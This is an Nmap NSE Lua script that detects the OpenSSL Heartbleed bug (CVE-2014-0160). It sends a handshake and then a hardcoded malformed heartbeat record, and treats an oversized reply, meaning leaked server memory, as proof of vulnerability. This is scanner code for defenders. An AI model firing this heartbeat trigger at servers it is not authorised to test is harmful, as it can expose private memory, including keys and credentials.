description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
The code is based on the Python script ssltest.py authored by Jared Stafford (jspenguin@jspenguin.org)
]]

---
-- @usage
-- nmap -p 443 --script ssl-heartbleed <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-- |
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://www.openssl.org/news/secadv_20140407.txt
-- |_      http://cvedetails.com/cve/2014-0160/
--
--

local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local string = require('string')
local vulns = require('vulns')

author = "Patrik Karlsson <patrik@cqure.net>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

portrule = function(host, port)
  return shortport.ssl(host, port) or sslcert.isPortSupported(port)
end

local function recvmsg(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record header - server closed connection')
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  local pay
  status, pay = s:receive_buf(match.numbytes(ln), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record payload - server closed connection')
    return
  end
  return true, typ, ver, pay
end

action = function(host, port)
  local vuln_table = {
    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    ]],

    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local hello = bin.pack('H', [[16 03 02 00  dc 01 00 00 d8 03 02 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01]])

  local hb = bin.pack('H', '18 03 02 00 03 01 40 00')

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local s = nmap.new_socket()
  s:set_timeout(5000)
  s:connect(host, port, "tcp")
  s:send(hello)

  while(true) do
    local status, typ, ver, pay = recvmsg(s)
    if not status then
      return report:make_output(vuln_table)
    end
    if ( typ == 22 and string.byte(pay,1) == 14 ) then break end
  end

  s:send(hb)
  while(true) do
    local status, typ, ver, pay = recvmsg(s)
    if not status then
      stdnse.print_debug(3, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      s:close()
      if #pay > 3 then
        vuln_table.state = vulns.STATE.VULN
        break
      else
        stdnse.print_debug(3, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(3, 'Server returned error, likely not vulnerable')
      break
    end
  end
  return report:make_output(vuln_table)
end
